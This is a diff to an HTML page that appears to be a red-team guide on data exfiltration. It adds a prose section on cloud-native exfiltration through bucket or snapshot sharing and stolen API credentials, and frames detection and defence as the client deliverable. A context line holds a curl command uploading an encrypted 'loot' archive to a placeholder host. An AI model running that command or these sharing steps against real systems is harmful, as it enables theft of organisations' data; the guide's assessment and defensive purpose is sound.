@@ -132,6 +132,17 @@ curl -s -F "f=@loot.tar.gz.enc" https://&lt;your-host&gt;/u    # HTTPS POST
           <li><strong>Blend timing</strong> with business hours and normal traffic patterns.</li>
         </ul>
 
+        <h2>Cloud-native exfiltration</h2>
+        <p>
+          When the data already lives in the cloud, the quietest path never touches an
+          endpoint or the corporate egress at all: share a storage bucket or a disk
+          snapshot to an attacker-controlled account, make an object world-readable, or
+          copy between accounts with the victim&rsquo;s own API credentials. The bytes
+          move provider-to-provider over sanctioned APIs, so endpoint DLP and network
+          egress filtering never see them &mdash; here the control that matters is cloud
+          audit logging and resource-sharing policy, not the network boundary.
+        </p>
+
         <h2>Detection &amp; defence (the real deliverable)</h2>
         <p>
           The value to the client is which of these the blue team catches. Defences
